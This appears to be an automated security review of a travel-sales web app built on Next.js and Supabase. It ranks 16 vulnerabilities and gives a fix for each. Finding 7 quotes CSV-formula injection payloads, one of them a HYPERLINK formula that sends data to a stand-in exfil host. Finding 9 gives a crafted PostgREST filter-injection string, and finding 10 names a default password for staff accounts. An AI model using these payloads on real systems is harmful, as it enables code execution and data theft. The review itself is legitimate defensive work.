# Security Review — Luxus Sales System

| Field | Value |
| --- | --- |
| Repository | `hawkcoding/v0-luxu-sales-system` |
| Run date | 2026-05-03 |
| Branch reviewed | `claude/security-review-2026-05-03` (forked from `claude/friendly-curie-45Fhu`) |
| Overall security posture | **Poor** |
| Total findings | 16 |
| Highest-risk issue | Unauthenticated public intake (`POST /api/enquiries`) executed with the Supabase **service-role** key, no Zod validation, no rate-limit |
| Lowest-risk issue | `next dev` HMR-websocket CSRF bypass (CVE-2026-27977) — dev-mode only |

---

## 1. Summary

- **Total vulnerabilities:** 16 distinct issues across application, dependency, and configuration layers.
- **Highest-risk issue:** `app/api/enquiries/route.ts` is an unauthenticated POST endpoint that uses `createServiceClient()` (RLS bypass) with no input validation, no rate limiting, and no abuse controls. An anonymous attacker can write to `customers`, `bookings`, `booking_suites`, `travellers`, `booking_transport_requests`, and `audit_logs`, optionally injecting arbitrary JSON into `extracted_json`. Combined with a global Postgres `bookings` sequence this is also a guaranteed PII/data-poisoning + DoS vector.
- **Lowest-risk issue:** Next.js `next dev` HMR-websocket null-origin CSRF bypass (CVE-2026-27977, low). Affects development only.
- **Overall posture:** **Poor.** Several core RLS policies are wide-open `USING (true)` for any authenticated user (consultant or readonly), multiple write endpoints accept `body.actor` for audit logs (audit-trail spoofing), public/cron endpoints bypass RLS without input validation, and the deployed Next.js (`16.1.6`) is exposed to five published advisories including a fixed-in-`16.2.3` DoS issue. There are no security headers (CSP/X-Frame-Options/etc.) configured and no CSRF protection beyond Next.js's default Server-Action origin checks.

---

## 2. Risk Matrix

| # | Issue | Likelihood | Impact | Risk Level |
| -- | --- | --- | --- | --- |
| 1 | Public service-role intake at `POST /api/enquiries` (no auth, no validation, no rate-limit) | High | High | **Critical** |
| 2 | RLS policies are `USING (true)` for all authenticated users on `customers`, `bookings`, `payments`, `quotes`, `quote_line_items`, `documents`, `correspondences`, `audit_logs`, `travellers` — no role separation between `readonly`/`consultant` and `manager`/`admin` | High | High | **Critical** |
| 3 | `POST /api/correspondence` is unauthenticated, accepts `body.actor`, blindly writes `body.bodyHtml`, and applies arbitrary `body.moveStage` bypassing pipeline guards | High | High | **Critical** |
| 4 | `POST /api/payments` and `PATCH /api/payments/[id]` accept `body.actor` and amount changes without validation; payment audit actor is fully attacker-controlled | High | High | **High** |
| 5 | `next` 16.1.6 vulnerable to 5 published advisories (CVE-2026-29057 request smuggling, CVE-2026-27978 Server-Actions CSRF, CVE-2026-27979/27980 DoS, plus a DoS fixed in 16.2.3 — GHSA `next: Denial of Service with Server Components`) | High | Medium | **High** |
| 6 | `EMAIL_CREDENTIAL_ENCRYPTION_KEY` accepts any string of any entropy and is silently SHA-256-stretched — no length / strength check, undocumented in `.env.local.example` | Medium | High | **High** |
| 7 | CSV audit export (`exportAuditToCsv`) does not neutralise leading `=`, `+`, `-`, `@`, `|`, `\t`, `\r` — CSV-formula injection in Excel/LibreOffice via attacker-controlled `actor`, `entity_id`, `meta_json` | Medium | Medium | **High** |
| 8 | Stored XSS in template preview: `app/app/templates/page.tsx:232` renders user-stored `bodyHtml` via `dangerouslySetInnerHTML` without sanitisation; `PATCH /api/templates` writes raw HTML with no role check | Medium | High | **High** |
| 9 | PostgREST OR-injection surface in `/api/customers` search — input is escaped only for `,`, `%`, `_`; parentheses, dots, and PostgREST operators (`fts.`, `not.`, `or(...)`) remain usable for filter manipulation | Medium | Medium | **Medium** |
| 10 | Dev "Quick Login" auto-fills production usernames (`carmen@…`, `dirk@…`, `leonie@…`) and password `password123` — same credentials almost certainly live in real Supabase Auth; gated only by `NODE_ENV` check that an attacker cannot influence but the credentials themselves leak | Medium | Medium | **Medium** |
| 11 | `lib/seed-data.ts:139` hard-codes a partial bank account / branch reference in an email template, committed to git history | Low | Medium | **Medium** |
| 12 | No security headers — `next.config.mjs` ships no CSP, no `X-Frame-Options`, no `Strict-Transport-Security`, no `Referrer-Policy`, no `Permissions-Policy` | High | Low | **Medium** |
| 13 | `lodash` and `picomatch` transitive vulns (RCE in `_.template`, ReDoS in picomatch extglob, prototype pollution in `_.unset`) — surface depends on call sites; reachable via Vitest tooling chain | Low | High | **Medium** |
| 14 | `vite` ≥7.1.0 ≤7.3.1 dev-server arbitrary file read / `server.fs.deny` bypass — only relevant locally but the project ships `vite-tsconfig-paths` and uses `vitest` | Low | Medium | **Low** |
| 15 | `uuid` <14 missing buffer bounds check; `postcss` <8.5.10 stringify XSS — both transitive, low reachability | Low | Low | **Low** |
| 16 | Next.js dev HMR null-origin CSRF (CVE-2026-27977) — dev only | Low | Low | **Low** |

---

## 3. Detailed Findings

### 1. Public service-role enquiry intake — `app/api/enquiries/route.ts`
- **Description:** `POST /api/enquiries` deliberately uses `createServiceClient()` ("public form") and writes to six tables (`customers`, `bookings`, `booking_suites`, `travellers`, `booking_transport_requests`, `audit_logs`). There is no authentication, no Zod schema, no captcha/turnstile, no per-IP rate limit, no payload size cap, and `extracted_json` accepts an arbitrary `Record<string, unknown>` from the request body. `body.email`/`body.name`/etc. are typed as `any` and used directly.
- **Affected area:** `app/api/enquiries/route.ts:88-319`, `lib/supabase/server.ts:45`.
- **Likelihood / Impact / Risk:** High / High / **Critical**.
- **Effort:** Medium — add a Zod schema, drop `createServiceClient()` in favour of an `anon`-restricted insert RPC, rate-limit (e.g. Upstash or Vercel KV), and reject oversized bodies.
- **Cost implication:** Low (config + KV).
- **Scope of fix:** Cross-cutting — affects RLS policy design and rate-limit infra.
- **Recommended fix:** (a) Validate the body with Zod, including `extracted_json` keys/values; (b) replace the service client with a `createAnonClient()` that calls an `INSERT … RETURNING` SECURITY DEFINER RPC restricted to required columns; (c) require a Vercel-edge rate limiter (≤5 submissions/IP/min) and an HMAC anti-spam token issued by the public form; (d) cap request size in the handler (e.g. `req.headers.get("content-length")` check) and bail at >32 KB.

### 2. Permissive RLS on business tables
- **Description:** Migration `20260308095136_remote_schema.sql` grants `biz_select`/`biz_insert`/`biz_update`/`biz_delete` `USING (true)` `WITH CHECK (true)` to **all** authenticated users on customer-PII and financial tables. There is no separation between `readonly`/`consultant` and `manager`/`admin` for these tables. The application enforces role checks in API routes, but a stolen `consultant` token used directly against PostgREST (the public Supabase URL + anon key are public) lets the holder read every customer record, every payment, and every audit log; create or delete payments; and tamper with audit history.
- **Affected area:** `supabase/migrations/20260308095136_remote_schema.sql:1179-1335`, `lib/supabase/client.ts`, `NEXT_PUBLIC_SUPABASE_*` (publicly known by design).
- **Likelihood / Impact / Risk:** High / High / **Critical**.
- **Effort:** High — RLS redesign across all `biz_*` tables.
- **Cost implication:** Medium.
- **Scope of fix:** Cross-cutting (DB + every API call path that depended on permissive RLS).
- **Recommended fix:** Tighten policies to use `auth_has_role(...)` (already used for `ref_*` and `profiles_*`). At minimum: `customers`, `payments`, `audit_logs`, `quote_line_items`, `documents`, `correspondences` writes restricted to `manager`/`admin`; `audit_logs` updates/deletes restricted to `admin` only (currently writable by anyone authenticated, which destroys the integrity of the audit trail). Add `WITH CHECK` clauses that lock `actor_user_id` to `auth.uid()` for inserts.

### 3. Unauthenticated `POST /api/correspondence`
- **Description:** No `auth.getUser()` check at all. Accepts `bookingId`, `bodyHtml`, `actor`, `moveStage` straight from the body. `Math.random() > 0.1` decides `success`. If `body.moveStage` is supplied, it bypasses the pipeline-validator wired into `PATCH /api/jobs/[id]` and writes a stage-change audit log under whatever `body.actor` value the caller chooses. RLS would still allow this if abused via the anon key.
- **Affected area:** `app/api/correspondence/route.ts:5-80`.
- **Likelihood / Impact / Risk:** High / High / **Critical**.
- **Effort:** Low.
- **Cost implication:** Low.
- **Scope of fix:** Localised.
- **Recommended fix:** Replace with the standard pattern: `createSessionClient()` → `auth.getUser()` (401 on miss) → fetch `profiles.clearance_level` → Zod-parse the body → derive `actor` from the resolved profile → reject `moveStage` and require routing through `PATCH /api/jobs/[id]`.

### 4. Spoofable `actor` and unvalidated payment writes
- **Description:** `POST /api/payments` (no auth check at all) and `PATCH /api/payments/[id]` accept arbitrary numeric `body.amount` and a free-form `body.actor` written verbatim into `audit_logs.actor`. The audit trail is therefore unreliable for any payment mutation. There is no Zod validation of `amount`, `method`, or `reference`.
- **Affected area:** `app/api/payments/route.ts:5-46`, `app/api/payments/[id]/route.ts:4-40`.
- **Likelihood / Impact / Risk:** High / High / **High**.
- **Effort:** Low.
- **Cost implication:** Low.
- **Scope of fix:** Localised.
- **Recommended fix:** Always derive `actor` from the resolved Supabase user/profile; never trust `body.actor`. Add a `paymentSchema` (`amount: z.number().positive().max(...)`, `method: z.enum([...])`, `reference: z.string().max(120)`). Require `manager`/`admin` for monetary changes.

### 5. Next.js 16.1.6 — multiple published advisories
- **Description:** `pnpm audit` reports five Next.js advisories against the pinned `next@16.1.6`:
  - GHSA-ggv3-7p47-pfv8 (CVE-2026-29057) — HTTP request smuggling in rewrites (moderate). Fixed in 16.1.7.
  - GHSA-3x4c-7xq6-9pq8 (CVE-2026-27980) — `next/image` unbounded disk cache → DoS. Fixed in 16.1.7.
  - GHSA-h27x-g6w4-24gq (CVE-2026-27979) — postponed-resume buffering DoS. Fixed in 16.1.7.
  - GHSA-mq59-m269-xvcx (CVE-2026-27978) — `Origin: null` Server-Actions CSRF bypass. Fixed in 16.1.7.
  - "Next.js has a Denial of Service with Server Components" — high. Fixed in 16.2.3.
  - GHSA-jcc7-9wpm-mj36 (CVE-2026-27977) — dev HMR null-origin CSRF (low). Fixed in 16.1.7.
- **Affected area:** `package.json:82`, `pnpm-lock.yaml`.
- **Likelihood / Impact / Risk:** High / Medium / **High**.
- **Effort:** Low (`pnpm up next@^16.2.3`), then verify build & Playwright/Vitest.
- **Cost implication:** Low.
- **Scope of fix:** Localised dependency bump.
- **Recommended fix:** Bump `next` to `^16.2.3` and re-run `pnpm install --frozen-lockfile`, `pnpm test:ci`, `pnpm build`.

### 6. Email credential encryption key — no entropy enforcement, undocumented
- **Description:** `lib/inbound-email/crypto.ts` SHA-256-stretches `process.env.EMAIL_CREDENTIAL_ENCRYPTION_KEY` to a 32-byte AES-GCM key but accepts **any** non-empty string. There is no length/strength validation, no rotation versioning beyond the literal `"v1"` prefix, and the variable is missing from `.env.local.example`, so operators have no guidance on entropy. Existing rows would silently decrypt with a weak key.
- **Affected area:** `lib/inbound-email/crypto.ts:6-14`, `.env.local.example`, `lib/inbound-email/sync.ts:51` (passes decrypted IMAP password).
- **Likelihood / Impact / Risk:** Medium / High / **High**.
- **Effort:** Low.
- **Cost implication:** Low.
- **Scope of fix:** Localised; add a one-time re-encryption migration if existing keys are upgraded.
- **Recommended fix:** Require ≥32 bytes (base64) at startup; throw if the key looks weak. Document the variable in `.env.local.example` and the deployment runbook. Consider versioning past `v1` so future key rotation is supported.

### 7. CSV-formula injection in audit export
- **Description:** `lib/export-audit.ts:exportAuditToCsv` only doubles `"`. Cells starting with `=`, `+`, `-`, `@`, `|`, `\t`, `\r` are passed through. Attacker-controlled values flow through `actor` (settable from several routes — see findings 3 and 4), `entity_id`, and JSON dumps of `meta_json`/`before_json`/`after_json`. When a manager opens the export in Excel/LibreOffice, formulas execute (`=cmd|'/c calc'!A0`, `=HYPERLINK("https://exfil/?d="&A1,…)`).
- **Affected area:** `lib/export-audit.ts:85-122`, downstream consumer `app/api/audit/export/route.ts`.
- **Likelihood / Impact / Risk:** Medium / Medium / **High**.
- **Effort:** Low.
- **Cost implication:** Low.
- **Scope of fix:** Localised.
- **Recommended fix:** Prefix any cell whose first character is `=`, `+`, `-`, `@`, `|`, `\t`, `\r` with a single quote (`'`) — this is the OWASP-recommended neutralisation. Cover both `exportAuditToCsv` and `exportAuditToText` (text export is less risky but used as a fallback).

### 8. Stored XSS in template preview
- **Description:** `app/app/templates/page.tsx:232` renders saved template HTML via `dangerouslySetInnerHTML={{ __html: preview?.bodyHtml || "" }}`. `PATCH /api/templates` (`app/api/templates/route.ts:24-67`) does not authenticate, does not check role, does not sanitise `body.bodyHtml`, and writes the value verbatim. Because the same template body is later sent in customer-facing emails (`app/api/correspondence/route.ts:21`), the impact extends to outbound HTML email content.
- **Affected area:** `app/app/templates/page.tsx`, `app/api/templates/route.ts`, `app/api/correspondence/route.ts`.
- **Likelihood / Impact / Risk:** Medium / High / **High**.
- **Effort:** Medium — sanitise on write (e.g. `sanitize-html` or `DOMPurify` server-side), authenticate the route, and restrict writes to `admin`.
- **Cost implication:** Low.
- **Scope of fix:** Cross-cutting (template editor + correspondence pipeline).
- **Recommended fix:** Server-side sanitise the HTML against an allowlist of tags/attributes before persisting; require `admin`/`manager` clearance; render previews into an `<iframe sandbox>` or sanitised string. Apply Content-Security-Policy with `script-src 'self'` (see finding 12).

### 9. PostgREST OR-injection in customer search
- **Description:** `app/api/customers/route.ts:24-28` builds the `or()` filter with raw user input. Escaping covers `,`, `%`, `_`, but not parentheses, periods, or PostgREST operator names. A logged-in user can craft `?search=%29,id.eq.<uuid>,first_name.ilike.%(` to short-circuit the filter and enumerate by `id`. The escape also strips `,` to a space, which silently drops query semantics rather than rejecting them.
- **Affected area:** `app/api/customers/route.ts:24-28`. Similar but lower-risk: `app/api/locations/route.ts:162` interpolates a UUID that is already validated, and `app/api/suppliers/route.ts:30` and `app/api/packages/[slug]/helpers.ts:54` interpolate slug bases derived from validated input.
- **Likelihood / Impact / Risk:** Medium / Medium / **Medium**.
- **Effort:** Low.
- **Cost implication:** Low.
- **Scope of fix:** Localised.
- **Recommended fix:** Either reject any character outside `[\p{L}\p{N} @._-]` before building the filter, or run four separate `.ilike()` queries and union the IDs. Mirror the same audit on every other `.or(\`…\${userInput}…\`)` site.

### 10. Dev quick-login defaults expose real Luxus emails + `password123`
- **Description:** `app/login/page.tsx:16-23` ships a hard-coded fallback list of five `*@luxustravel.co.za` emails and the password `password123`. The button is gated by `process.env.NODE_ENV === "development"`, but the strings themselves are baked into the bundle, telling any reader (including any attacker who clones the repo) which accounts to credential-stuff. There is a high probability one of those accounts uses `password123` in production today.
- **Affected area:** `app/login/page.tsx:14-100`.
- **Likelihood / Impact / Risk:** Medium / Medium / **Medium**.
- **Effort:** Low.
- **Cost implication:** Low.
- **Scope of fix:** Localised + immediate password rotation.
- **Recommended fix:** Replace the hard-coded fallback with a non-existent placeholder (e.g. `dev@example.invalid`) and rely solely on the operator-set `localStorage` keys. Force a password reset for every account in the hard-coded list and audit Supabase Auth logs for previous use of `password123`.

### 11. Hard-coded partial bank reference in seed data
- **Description:** `lib/seed-data.ts:139` includes a deposit-request email template body with FNB account holder + branch (250655) + account "62XXXXXXXX" committed to git history. While the account number is masked, the bank, branch code, and reference template assist in invoice spoofing.
- **Affected area:** `lib/seed-data.ts:139`.
- **Likelihood / Impact / Risk:** Low / Medium / **Medium**.
- **Effort:** Low.
- **Cost implication:** Low.
- **Scope of fix:** Localised.
- **Recommended fix:** Replace with placeholders (`<BANK>`, `<ACCOUNT_NUMBER>`, `<BRANCH>`); pull live banking details from `app_settings` at render time.

### 12. Missing security response headers
- **Description:** `next.config.mjs` provides only `images.unoptimized: true`. There is no `headers()` config, no Content-Security-Policy, no `X-Frame-Options`, no `Strict-Transport-Security`, no `Referrer-Policy`, no `Permissions-Policy`. Combined with finding 8, lack of CSP makes stored-HTML XSS more impactful.
- **Affected area:** `next.config.mjs`, `vercel.json`.
- **Likelihood / Impact / Risk:** High / Low / **Medium**.
- **Effort:** Low.
- **Cost implication:** Low.
- **Scope of fix:** Localised.
- **Recommended fix:** Add a `headers()` block with at least: `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`, `X-Frame-Options: DENY` (or `Content-Security-Policy: frame-ancestors 'none'`), `Referrer-Policy: strict-origin-when-cross-origin`, `Permissions-Policy: camera=(), microphone=(), geolocation=()`, and a CSP with `default-src 'self'`, `script-src 'self' 'unsafe-inline'` (tighten when the inline-script audit allows it), `connect-src 'self' https://*.supabase.co https://api.resend.com`.

### 13. Transitive lodash / picomatch advisories
- **Description:** `pnpm audit` reports `lodash` ≤4.17.23 (RCE via `_.template` import-key names — high; prototype pollution in `_.unset` — moderate) and `picomatch` 4.0.0–4.0.3 (ReDoS via extglob quantifiers — high; method-injection POSIX class — moderate). Both are pulled in transitively (Vitest/build tooling).
- **Affected area:** `pnpm-lock.yaml`.
- **Likelihood / Impact / Risk:** Low / High / **Medium**.
- **Effort:** Medium (`pnpm up -L` + verify the transitive callers; may require pinning).
- **Cost implication:** Low.
- **Scope of fix:** Localised.
- **Recommended fix:** Add `pnpm.overrides` for `lodash@^4.18.0` and `picomatch@^4.0.4`; run `pnpm install --lockfile-only` and re-test.

### 14. Vite dev-server file read / `server.fs.deny` bypass
- **Description:** Three high/moderate advisories against `vite` 7.0.0–7.3.1: arbitrary file read via dev-server WebSocket, `server.fs.deny` bypass with queries, and path traversal in optimised-deps `.map` handling. Vite ships via `vite-tsconfig-paths` and `vitest`. Risk is bounded to local development machines but matters because tests are run by CI.
- **Affected area:** `pnpm-lock.yaml`, `vitest.config.ts`.
- **Likelihood / Impact / Risk:** Low / Medium / **Low**.
- **Effort:** Low (`pnpm up vitest@latest`, transitive resolution).
- **Cost implication:** Low.
- **Scope of fix:** Localised.
- **Recommended fix:** Bump `vite` ≥7.3.2 via `pnpm.overrides`; never run the Vite dev server bound to `0.0.0.0` on shared/CI networks.

### 15. `uuid` <14 / `postcss` <8.5.10 transitive issues
- **Description:** `uuid` <14 is missing a buffer bounds check in v3/v5/v6 buffer mode (only triggers when callers pass `buf`). `postcss` <8.5.10 has an XSS via unescaped `</style>` in CSS stringify output — only relevant if PostCSS output is reflected in user-controlled contexts.
- **Affected area:** `pnpm-lock.yaml`.
- **Likelihood / Impact / Risk:** Low / Low / **Low**.
- **Effort:** Low.
- **Cost implication:** Low.
- **Scope of fix:** Localised.
- **Recommended fix:** Add `pnpm.overrides` to pin `uuid@^14.0.0` and `postcss@^8.5.10`.

### 16. Next.js dev HMR null-origin CSRF (CVE-2026-27977)
- **Description:** Affects `next dev` only when `allowedDevOrigins` is configured. Not currently configured in this repo, so impact is theoretical, but it is bundled with the same fix release as findings 5.
- **Affected area:** `next` 16.1.6.
- **Likelihood / Impact / Risk:** Low / Low / **Low**.
- **Effort:** Low.
- **Cost implication:** Low.
- **Scope of fix:** Localised.
- **Recommended fix:** Resolved automatically by the `next` ≥16.2.3 bump in finding 5.

---

## 4. Priority Actions

Ordered by best risk-reduction-per-effort:

1. **Bump `next` to ≥16.2.3** (`pnpm up next@^16.2.3`). Closes findings 5, 16 in one change and prevents the request-smuggling, Server-Actions CSRF, DoS, and dev HMR bypass issues.
2. **Lock down `POST /api/enquiries`** (finding 1): add Zod validation, switch off the service-role client, add edge rate-limiting, cap request body size. Highest single-issue risk reduction.
3. **Add authentication + role checks + Zod validation to `/api/correspondence`, `/api/payments`, `/api/payments/[id]`, `/api/templates` PATCH** (findings 3, 4, 8). Trivial code changes that close write-side abuse. While editing, derive `actor` from the resolved profile in every route — never trust `body.actor`.
4. **Tighten RLS** on `customers`, `payments`, `audit_logs`, `quote_line_items`, `documents`, `correspondences`, `travellers` to require `auth_has_role(...)` (finding 2). Use the existing `ref_*` policies as the pattern. Lock `audit_logs` UPDATE/DELETE to nothing (insert-only), and force `actor_user_id = auth.uid()` on insert.
5. **Neutralise CSV formula injection** in `lib/export-audit.ts` (finding 7) — single-file change.
6. **Sanitise template HTML** server-side and add CSP (findings 8 and 12) — together they neutralise the stored-HTML XSS class.
7. **Rotate "dev quick-login" passwords** for every `*@luxustravel.co.za` account, then remove the hard-coded fallback list (finding 10). Treat as an incident if `password123` was ever active.
8. **Pin transitive `lodash`, `picomatch`, `vite`, `uuid`, `postcss`** via `pnpm.overrides` (findings 13–15).
9. **Fix the customer-search OR-injection escape** (finding 9).
10. **Document and validate** `EMAIL_CREDENTIAL_ENCRYPTION_KEY` (finding 6); replace seeded bank reference with placeholders (finding 11).

---

_Report generated automatically by the security review pipeline. Re-run after applying fixes to verify the posture rating._
